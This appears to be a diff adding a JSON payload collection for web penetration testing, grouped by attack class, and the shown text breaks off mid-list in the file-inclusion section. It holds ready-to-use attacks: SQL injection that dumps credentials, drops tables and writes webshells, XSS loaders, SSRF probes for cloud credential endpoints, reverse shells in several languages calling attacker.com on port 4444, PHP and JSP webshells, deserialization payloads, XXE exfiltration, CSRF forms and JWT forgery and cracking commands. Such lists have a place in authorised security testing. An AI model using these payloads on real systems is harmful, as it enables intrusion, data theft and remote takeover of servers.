@@ -1,0 +1,838 @@
+{
+  "payloads": {
+    "sql_injection": {
+      "detection": [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR '1'='1' /*",
+        "admin' --",
+        "admin' #",
+        "admin'/*",
+        "' OR 1=1--",
+        "\" OR 1=1--",
+        "' OR 'a'='a",
+        "') OR ('a'='a",
+        "1' OR '1'='1' LIMIT 1--",
+        "1; SELECT 1",
+        "1' AND 1=1",
+        "1' AND 1=2",
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+        "1' AND SUBSTRING(@@version,1,1)='5'",
+        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+        "1' AND (SELECT COUNT(*) FROM users)>0--",
+        "'; WAITFOR DELAY '0:0:5'--",
+        "1' AND SLEEP(5)--",
+        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "1' UNION SELECT NULL--",
+        "1' UNION SELECT NULL,NULL--",
+        "1' UNION SELECT NULL,NULL,NULL--",
+        "1' UNION SELECT 1,2,3--",
+        "1' UNION ALL SELECT 1,2,3--",
+        "1' UNION SELECT username,password FROM users--",
+        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
+        "1' ORDER BY 1--",
+        "1' ORDER BY 10--",
+        "1' GROUP BY columnnames HAVING 1=1--",
+        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+        "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
+        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "1'; SELECT IF(1=1,SLEEP(5),0)--",
+        "1' AND 1=CONVERT(int,@@version)--",
+        "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+      ],
+      "union_based": [
+        "' UNION SELECT NULL,NULL,NULL,NULL--",
+        "' UNION SELECT 1,2,3,4--",
+        "' UNION SELECT username,password,NULL,NULL FROM users--",
+        "' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--",
+        "' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
+        "' UNION SELECT CONCAT(username,':',password),NULL,NULL,NULL FROM users--",
+        "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL--",
+        "' UNION SELECT NULL INTO OUTFILE '/var/www/html/shell.php'--",
+        "1 UNION SELECT 1,2,3--",
+        "1 UNION ALL SELECT 1,2,3,4--",
+        "-1 UNION SELECT 1,2,3--",
+        "' UNION SELECT @@version,NULL,NULL--",
+        "' UNION SELECT database(),NULL,NULL--",
+        "' UNION SELECT user(),NULL,NULL--",
+        "' UNION SELECT current_user(),NULL,NULL--",
+        "' UNION SELECT schema_name FROM information_schema.schemata--",
+        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
+        "' UNION SELECT CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_name LIKE '%user%'--"
+      ],
+      "blind": [
+        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
+        "' AND ASCII(SUBSTRING((SELECT database()),1,1))=100--",
+        "' AND LENGTH((SELECT database()))>0--",
+        "' AND LENGTH((SELECT database()))=8--",
+        "' AND SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a'--",
+        "' AND (SELECT COUNT(*) FROM users)>0--",
+        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+        "' AND 1=(SELECT COUNT(*) FROM (SELECT DISTINCT(table_name) FROM information_schema.tables)a)--",
+        "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64--",
+        "' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--",
+        "' AND IF(1=1,SLEEP(5),0)--",
+        "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
+        "1' AND SELECT COUNT(*) FROM users--",
+        "1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')>0--",
+        "1' AND SUBSTRING((SELECT version()),1,1)='5'--"
+      ],
+      "time_based": [
+        "'; WAITFOR DELAY '0:0:5'--",
+        "'; WAITFOR DELAY '0:0:10'--",
+        "1' AND SLEEP(5)--",
+        "1' AND SLEEP(10)--",
+        "1' AND IF(1=1,SLEEP(5),0)--",
+        "1' AND IF(1=2,SLEEP(5),0)--",
+        "'; SELECT SLEEP(5)--",
+        "1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+        "1' AND BENCHMARK(5000000,SHA1('test'))--",
+        "1' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--",
+        "1'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--",
+        "1' AND (SELECT IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0))--",
+        "1' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0)--",
+        "1' AND (SELECT CASE WHEN ((SELECT COUNT(*) FROM users)>0) THEN SLEEP(5) ELSE 0 END)--",
+        "'; WAITFOR DELAY '0:0:5';--"
+      ],
+      "stacked_queries": [
+        "'; SELECT 1--",
+        "'; SELECT * FROM users--",
+        "'; DROP TABLE users--",
+        "1'; SELECT SLEEP(5)--",
+        "1'; SELECT IF(1=1,SLEEP(5),0)--",
+        "'; SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd'--",
+        "1'; INSERT INTO users VALUES('hacker','pass123')--",
+        "1'; UPDATE users SET role='admin' WHERE username='hacker'--",
+        "1'; DELETE FROM users WHERE username='victim'--",
+        "1'; SELECT 1 INTO OUTFILE '/var/www/html/shell.php'--"
+      ],
+      "out_of_band": [
+        "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share')))--",
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\share'))--",
+        "' AND (SELECT GET_FILE_CONCAT('\\\\\\\\',database(),'.attacker.com\\\\share'))--",
+        "1' AND (SELECT * FROM (SELECT(CONCAT(version(),0x3a,database(),0x3a,user()))a FROM information_schema.tables)b INTO OUTFILE '\\\\\\\\attacker.com\\share\\data.txt')--",
+        "' AND (SELECT 1 FROM dual WHERE (SELECT INTO DUAL LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share'))) IS NOT NULL)--"
+      ]
+    },
+    "xss": {
+      "basic": [
+        "<script>alert(1)</script>",
+        "<script>alert('XSS')</script>",
+        "<script>alert(document.cookie)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<body onload=alert(1)>",
+        "<iframe onload=alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
+        "<marquee onstart=alert(1)>",
+        "<video><source onerror=alert(1)>",
+        "<details ontoggle=alert(1) open>",
+        "<a href=javascript:alert(1)>click</a>",
+        "<form><button formaction=javascript:alert(1)>X</button>",
+        "<object data=javascript:alert(1)>",
+        "<embed src=javascript:alert(1)>",
+        "<applet code=alert(1)>",
+        "<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>"
+      ],
+      "filter_bypass": [
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<img src=x onerror=alert&#40;1&#41;>",
+        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+        "<svg/onload=alert(1)>",
+        "<svg onload=alert&#40;1&#41;>",
+        "<img/src=x/onerror=alert(1)>",
+        "<img src=x onerror = alert(1)>",
+        "<img src=x onerror = alert (1)>",
+        "<img src=x onerror = alert ( 'XSS' )>",
+        "javascript:alert(1)",
+        "JaVaScRiPt:alert(1)",
+        "java\nscript:alert(1)",
+        "javascript&#58;alert(1)",
+        "javascript&#000058;alert(1)",
+        "javascript&#x3A;alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+      ],
+      "dom_based": [
+        "#<script>alert(1)</script>",
+        "#<img src=x onerror=alert(1)>",
+        "javascript:void(document.cookie)",
+        "javascript:alert(document.domain)",
+        "javascript:alert(document.cookie)",
+        "#\" onfocus=alert(1) autofocus=\"",
+        "#\" onmouseover=alert(1)\"",
+        "<base href=javascript://>",
+        "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
+        "javascript:var%20b=document.createElement('script');b.src='http://evil.com/xss.js';document.body.appendChild(b);"
+      ],
+      "svg": [
+        "<svg/onload=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<svg><script>alert(1)</script></svg>",
+        "<svg><foreignObject><div xmlns='http://www.w3.org/1999/xhtml'><body onload=alert(1)></body></div></foreignObject></svg>",
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "<svg><set attributeName=x to=alert(1)>",
+        "<svg><use href='data:image/svg+xml,<svg onload=alert(1)>'/>",
+        "<svg><a xlink:href='javascript:alert(1)'><circle r=50/></a></svg>",
+        "<svg><foreignObject><body xmlns='http://www.w3.org/1999/xhtml' onload=alert(1)/></foreignObject></svg>",
+        "<svg><image href='data:image/svg+xml,<svg onload=alert(1)>'/>"
+      ],
+      "polyglot": [
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//",
+        ""><script>alert(1)</script>",
+        "'-alert(1)-'",
+        "\"><img src=x onerror=alert(1)>",
+        "'\"><script>alert(1)</script>",
+        "javascript:alert(1)//",
+        "http://www.example.com/';alert(String.fromCharCode(88,83,83))//"
+      ],
+      "csp_bypass": [
+        "https://twitter.com/anyuser",
+        "//evil.com/xss.js",
+        "/xss.js",
+        "<link rel=import href=http://evil.com/polymer.html>",
+        "<script src=//cdn.example.com/lib.js></script>",
+        "<link href=//evil.com/style.css rel=stylesheet>",
+        "<object data=//evil.com.swf>",
+        "<video poster=javascript:alert(1)>",
+        "<base href=https://evil.com/>"
+      ],
+      "event_handlers": [
+        "onload", "onerror", "onclick", "onmouseover", "onmouseout", "onfocus",
+        "onblur", "onsubmit", "onchange", "oninput", "onkeypress", "onkeydown",
+        "onkeyup", "ondblclick", "oncontextmenu", "ondrag", "ondragend", "ondragenter",
+        "ondragleave", "ondragover", "ondragstart", "ondrop", "oninput", "oninvalid",
+        "onmouseDown", "onMouseUp", "onmouseover", "onmousemove", "onmouseout",
+        "onmousewheel", "onreset", "onresize", "onscroll", "onselect", "onsubmit",
+        "onunload", "ontoggle", "onbegin", "onend", "onrepeat"
+      ]
+    },
+    "ssrf": {
+      "internal_access": [
+        "http://127.0.0.1",
+        "http://localhost",
+        "http://169.254.169.254",
+        "http://0.0.0.0",
+        "http://[::1]",
+        "http://0177.0.0.1",
+        "http://2130706433",
+        "http://0x7f000001",
+        "http://localhost:8080",
+        "http://127.0.0.1:22",
+        "http://127.0.0.1:3306",
+        "http://127.0.0.1:5432",
+        "http://127.0.0.1:6379",
+        "http://127.0.0.1:8000",
+        "http://127.0.0.1:8443",
+        "http://127.0.0.1:9200",
+        "http://127.0.0.1:27017",
+        "http://127.0.0.1:11211"
+      ],
+      "cloud_metadata": {
+        "aws": [
+          "http://169.254.169.254/latest/meta-data/",
+          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-role",
+          "http://169.254.169.254/latest/meta-data/instance-id",
+          "http://169.254.169.254/latest/meta-data/hostname",
+          "http://169.254.169.254/latest/meta-data/public-keys/",
+          "http://169.254.169.254/latest/meta-data/user-data/",
+          "http://169.254.169.254/latest/dynamic/instance-identity/document"
+        ],
+        "gcp": [
+          "http://metadata.google.internal/computeMetadata/v1/",
+          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+          "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+          "http://metadata.google.internal/computeMetadata/v1/instance/name",
+          "http://metadata.google.internal/computeMetadata/v1/instance/zone"
+        ],
+        "azure": [
+          "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
+          "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
+          "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+        ],
+        "digital_ocean": [
+          "http://169.254.169.254/metadata/v1/",
+          "http://169.254.169.254/metadata/v1/id",
+          "http://169.254.169.254/metadata/v1/user-data"
+        ]
+      },
+      "protocol_handlers": [
+        "file:///etc/passwd",
+        "file:///proc/self/environ",
+        "file:///proc/self/cmdline",
+        "file:///proc/self/fd/0",
+        "gopher://127.0.0.1:25/",
+        "gopher://127.0.0.1:6379/_INFO",
+        "gopher://127.0.0.1:11211/_stats",
+        "dict://127.0.0.1:6379/INFO",
+        "dict://127.0.0.1:6379/CONFIG SET dir /tmp/",
+        "tftp://attacker.com/file",
+        "smb://127.0.0.1/share/",
+        "ldap://127.0.0.1/",
+        "netdoc:///etc/passwd",
+        "jar:http://127.0.0.1:8080/!"
+      ],
+      "bypass_techniques": {
+        "ip_representation": [
+          "http://0177.0.0.1/",
+          "http://127.1/",
+          "http://127.0.1/",
+          "http://0x7f000001/",
+          "http://2130706433/",
+          "http://0/",
+          "http://127.0.0.1.nip.io/",
+          "http://127.0.0.1.xip.io/",
+          "http://localtest.me/",
+          "http://spoofed.burpcollaborator.net/",
+          "http://[::]/",
+          "http://[0:0:0:0:0:0:0:1]/",
+          "http://0177.0.0.1:80/",
+          "http://0x7f.0x00.0x00.0x01/",
+          "http://127%2e0%2e0%2e1/",
+          "http://127%252e0%252e0%252e1/",
+          "http://127.0.0.1%23.attacker.com/",
+          "http://attacker.com#@127.0.0.1/",
+          "http://127.0.0.1\t/",
+          "http://127.0.0.1\n/",
+          "http://127.0.0.1:80\r\nX-Injected:header/"
+        ],
+        "redirect_bypass": [
+          "http://attacker.com/redirect?to=http://169.254.169.254",
+          "http://legitimate.com/redirect?url=http://127.0.0.1",
+          "http://attacker.com/302?url=http://169.254.169.254/latest/meta-data/",
+          "http://short.url/abc -> 301 -> http://169.254.169.254"
+        ],
+        "dns_rebinding": [
+          "http://0.0.0.0.nip.io/",
+          "http://127.0.0.1.nip.io/",
+          "http://localtest.me/",
+          "http://rbnd.gl/",
+          "http://rebind.owasp.org/",
+          "http://1u.ms/",
+          "http://nip.io/",
+          "http://sslip.io/"
+        ],
+        "ipv6": [
+          "http://[::1]/",
+          "http://[::ffff:127.0.0.1]/",
+          "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+          "http://[::ffff:7f00:1]/"
+        ]
+      }
+    },
+    "idor": {
+      "enumeration": [
+        "id=1", "id=2", "id=3", "id=100", "id=1000",
+        "user_id=1", "user_id=2", "user_id=other",
+        "account_id=1", "account_id=2",
+        "profile_id=1", "profile_id=2",
+        "doc_id=1", "doc_id=2",
+        "file_id=1", "file_id=2",
+        "order_id=1", "order_id=2",
+        "ticket_id=1", "ticket_id=2",
+        "invoice_id=1", "invoice_id=2",
+        "uuid=550e8400-e29b-41d4-a716-446655440000",
+        "token=abc123def456"
+      ],
+      "header_manipulation": [
+        "X-User-ID: 1",
+        "X-User-ID: admin",
+        "X-Forwarded-For: 127.0.0.1",
+        "X-Real-IP: 127.0.0.1",
+        "X-Original-URL: /admin",
+        "X-Forwarded-Host: admin.example.com",
+        "Authorization: Bearer admin_token",
+        "Cookie: user_id=admin",
+        "X-Account-ID: 1",
+        "X-Owner-ID: admin"
+      ],
+      "path_traversal": [
+        "../1",
+        "../../1",
+        "../../../1",
+        "..%2f1",
+        "..%252f1",
+        "%2e%2e%2f1",
+        "....//1",
+        "%c0%ae%c0%ae/1",
+        "..;/1",
+        "./1"
+      ],
+      "parameter_pollution": [
+        "id=1&id=2",
+        "user_id=me&user_id=admin",
+        "id[]=1&id[]=2",
+        "id=1&account_id=admin",
+        "owner=me&owner=admin"
+      ]
+    },
+    "rce": {
+      "command_injection": [
+        "; id",
+        "| id",
+        "|| id",
+        "& id",
+        "&& id",
+        "`id`",
+        "$(id)",
+        "; cat /etc/passwd",
+        "| cat /etc/passwd",
+        "; type C:\\windows\\win.ini",
+        "| type C:\\windows\\win.ini",
+        "; sleep 5",
+        "| sleep 5",
+        "`sleep 5`",
+        "$(sleep 5)",
+        "; ping -c 5 attacker.com",
+        "| ping -c 5 attacker.com"
+      ],
+      "blind_injection": [
+        "; sleep 5",
+        "| sleep 5",
+        "`sleep 5`",
+        "$(sleep 5)",
+        "; ping -c 5 attacker.com",
+        "| ping -c 5 attacker.com",
+        "`ping -c 5 attacker.com`",
+        "$(ping -c 5 attacker.com)",
+        "; nslookup attacker.com",
+        "| nslookup attacker.com",
+        "`nslookup attacker.com`"
+      ],
+      "filter_bypass": [
+        "c${x}at /etc/passwd",
+        "c${IFS}at /etc/passwd",
+        "cat${IFS}/etc/passwd",
+        "cat${IFS}-n /etc/passwd",
+        "/???/??t /???/p??s??",
+        "cat${IFS}y${IFS}/etc/passwd",
+        "c''at /etc/passwd",
+        "c\"\"at /etc/passwd",
+        "ca${@}t /etc/passwd",
+        "$@cat /etc/passwd",
+        "cat /etc/pas??",
+        "cat /etc/pas*",
+        "cat /etc/passwd*",
+        "{cat,/etc/passwd}",
+        "cat</etc/passwd"
+      ],
+      "reverse_shell": [
+        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}'",
+        "ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "nc -e /bin/sh attacker.com 4444",
+        "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('attacker.com','4444');os.execute('/bin/sh -i <&t >&t 2>&t');\"",
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f",
+        "0<&196;exec 196<>/dev/tcp/attacker.com/4444;sh <&196 >&196 2>&196"
+      ],
+      "webshell": [
+        "<?php system($_GET['cmd']); ?>",
+        "<?php eval($_POST['cmd']); ?>",
+        "<?php echo shell_exec($_GET['cmd']); ?>",
+        "<?php passthru($_GET['cmd']); ?>",
+        "<?php $a='sys'.'tem';$a($_GET['cmd']); ?>",
+        "<%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+        "<%response.write(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next())%>",
+        "<script language='JScript' runat='server'>var r = new ActiveXObject(\"WScript.Shell\");r.Exec(\"cmd /c \" + Request(\"cmd\"));</script>"
+      ],
+      "deserialization": {
+        "java": [
+          "rO0ABXNy...",
+          "ACED0005",
+          "base64_encoded_serialized_object"
+        ],
+        "php": [
+          "O:8:\"stdClass\":0:{}",
+          "a:1:{s:4:\"test\";s:5:\"hello\";}",
+          "C:8:\"DateTime\":19:{s:3:\"date\";s:19:\"2023-01-01 00:00:00\";}"
+        ],
+        "python": [
+          "cos\nsystem\n(S'ls'\ntR.",
+          "c__builtin__\nexec\n(S'import os; os.system(\"ls\")'\ntR.",
+          "gASVLgAAAAAAAACMCnN1YmVwcm9jZXNzlC4="
+        ],
+        "ruby": [
+          "BAhJOhxAOiBtZXRob2Rfc3RyaW5nOglydW5leHABAA=="
+        ],
+        "nodejs": [
+          "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls')}()\"}"
+        ]
+      }
+    },
+    "xxe": {
+      "basic": [
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/cmdline'>]><foo>&xxe;</foo>"
+      ],
+      "blind": [
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe?data=FILE'>]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]><foo>&send;</foo>"
+      ],
+      "parameter_entities": [
+        "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.dtd'>%xxe;]>",
+        "<!DOCTYPE foo [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?data=%file;\">'>%eval;%exfil;]>"
+      ],
+      "svg": [
+        "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><svg><text>&xxe;</text></svg>"
+      ],
+      "soap": [
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'><soap:Body>&xxe;</soap:Body></soap:Envelope>"
+      ],
+      "dos": [
+        "<!DOCTYPE lolz [<!ENTITY lol 'lol'><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'><!ENTITY lol2 '&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;'>&lol2;]>",
+        "<!DOCTYPE data [<!ENTITY a0000 'a'>&#a0000;&#a0000;&#a0000;&#a0000;]>",
+        "<!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol1 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'><!ENTITY lol2 '&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;'>&lol2;]>"
+      ]
+    },
+    "csrf": {
+      "basic": [
+        "<form method='POST' action='http://target.com/api/change-email'><input type='hidden' name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>",
+        "<img src='http://target.com/api/change-email?email=attacker@evil.com'>",
+        "<img src='http://target.com/api/delete-account'>"
+      ],
+      "xhr": [
+        "var xhr = new XMLHttpRequest();xhr.open('POST', 'http://target.com/api/change-email', true);xhr.withCredentials = true;xhr.send('email=attacker@evil.com');",
+        "fetch('http://target.com/api/change-email',{method:'POST',credentials:'include',body:'email=attacker@evil.com'})",
+        "$.ajax({url:'http://target.com/api/change-email',type:'POST',data:{email:'attacker@evil.com'},xhrFields:{withCredentials:true}})"
+      ],
+      "json": [
+        "var xhr = new XMLHttpRequest();xhr.open('POST', 'http://target.com/api/change-email', true);xhr.withCredentials = true;xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify({email:'attacker@evil.com'}));",
+        "fetch('http://target.com/api/change-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'})})"
+      ],
+      "flash": [
+        "<embed src='http://target.com/crossdomain.xml' type='application/x-shockwave-flash'>",
+        "Flash-based CSRF using crossdomain.xml"
+      ]
+    },
+    "jwt": {
+      "none_algorithm": [
+        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
+      ],
+      "algorithm_confusion": [
+        "Use RS256 public key as HS256 secret",
+        "Sign with public key file"
+      ],
+      "key_cracking": [
+        "hashcat -m 16500 jwt.txt wordlist.txt",
+        "john jwt.txt --wordlist=wordlist.txt",
+        "jwt_tool token.txt -C -d wordlist.txt"
+      ],
+      "token_manipulation": [
+        "Modify claims: {\"user\":\"admin\",\"role\":\"admin\"}",
+        "Change expiration: {\"exp\":9999999999}",
+        "Add claims: {\"admin\":true}"
+      ]
+    },
+    "graphql": {
+      "introspection": [
+        "{__schema{types{name,fields{name,kind}}}}",
+        "{__schema{queryType{name},mutationType{name},subscriptionType{name}}}",
+        "{__type(name:\"User\"){fields{name,type{name}}}}",
+        "{__type(name:\"Query\"){fields{name,args{name,type{name}}}}}",
+        "{__type(name:\"Mutation\"){fields{name,args{name,type{name}}}}}"
+      ],
+      "injection": [
+        "query{users(id:\"1 OR 1=1\"){id,email}}",
+        "query{users(name:\"admin'\"){id,email}}",
+        "mutation{login(username:\"admin\",password:\"pass' OR '1'='1\"){token}}"
+      ],
+      "batching": [
+        "[{\"query\":\"query{users{id,email}}\"},{\"query\":\"query{posts{id,title}}\"},{\"query\":\"query{comments{id,body}}\"}]",
+        "[{\"query\":\"mutation{updateUser(id:1,name:\"hacker\"){id}}\"},{\"query\":\"mutation{updateUser(id:2,name:\"hacker\"){id}}\"}]"
+      ],
+      "dos": [
+        "query{users{comments{author{comments{author{comments}}}}}}",
+        "{users{id posts{comments{author{posts{comments}}}}}}"
+      ],
+      "field_suggestion": [
+        "{__type(name:\"Query\"){fields{name,description}}}",
+        "{__type(name:\"Mutation\"){fields{name,description}}}"
+      ]
+    },
+    "race_condition": {
+      "concurrent_requests": [
+        "Burp Suite Turbo Intruder",
+        "OWASP ZAP Concurrent Requests",
+        "Custom Python script with threading",
+        "curl parallel requests",
+        "Apache Bench (ab) for concurrent requests"
+      ],
+      "common_targets": [
+        "Balance transfer endpoints",
+        "Coupon redemption APIs",
+        "Vote submission endpoints",
+        "Account creation flows",
+        "Password reset token generation",
+        "Two-factor authentication bypass"
+      ],
+      "payloads": [
+        "Send 100 concurrent POST requests to /transfer endpoint",
+        "Send 50 concurrent requests to /redeem-coupon with same code",
+        "Send 20 concurrent requests to /vote for same option"
+      ]
+    },
+    "ssrf_bypass": {
+      "cloud_metadata_bypass": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document"
+      ],
+      "ip_bypass": [
+        "http://0x7f000001/",
+        "http://2130706433/",
+        "http://0177.0.0.1/",
+        "http://127.0.0.1.nip.io/",
+        "http://localtest.me/",
+        "http://[::1]/",
+        "http://0/",
+        "http://127.1/",
+        "http://127.0.1/",
+        "http://127%2e0%2e0%2e1/",
+        "http://127%252e0%252e0%252e1/"
+      ],
+      "protocol_bypass": [
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:25/",
+        "dict://127.0.0.1:6379/",
+        "smb://127.0.0.1/",
+        "tftp://attacker.com/",
+        "ldap://127.0.0.1/"
+      ],
+      "redirect_bypass": [
+        "http://attacker.com/redirect?url=http://169.254.169.254",
+        "http://attacker.com/302?url=http://127.0.0.1",
+        "http://bit.ly/2abc123 -> http://169.254.169.254"
+      ]
+    },
+    "lfi": {
+      "basic_traversal": [
+        "../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "..%2f..%2f..%2fetc/passwd",
+        "..%252f..%252f..%252fetc/passwd",
+        "..\\..\\..\\etc\\passwd",
+        "....\\\\....\\\\....\\\\etc\\\\passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "..%c1%9c..%c1%9c..%c1%9cetc/passwd"
+      ],
+      "null_byte": [
+        "../../../etc/passwd%00",
+        "../../../etc/passwd%2500",
+        "../../../etc/passwd\x00",
+        "../../../etc/passwd%00.html",
+        "../../../etc/passwd%00.jpg"
+      ],
+      "php_wrappers": [
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://filter/convert.base64-encode/resource=config.php",
+        "php://filter/convert.base64-encode/resource=/etc/passwd",
+        "php://input",
+        "php://stdin",
+        "php://fd/3",
+        "php://temp",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+        "data://text/plain,<?php system($_GET['cmd']); ?>",
+        "phar://uploads/shell.jpg/test.txt",
+        "zip://uploads/shell.jpg%23test.txt",
+        "convert.iconv.utf-8.utf-16be/resource=config.php",
+        "convert.quoted-printable-encode/resource=config.php",
+        "convert.iconv.utf-8.utf-32le/resource=config.php"
+      ],
+      "log_poisoning": [
+        "/var/log/apache2/access.log",
+        "/var/log/apache2/error.log",
+        "/var/log/nginx/access.log",
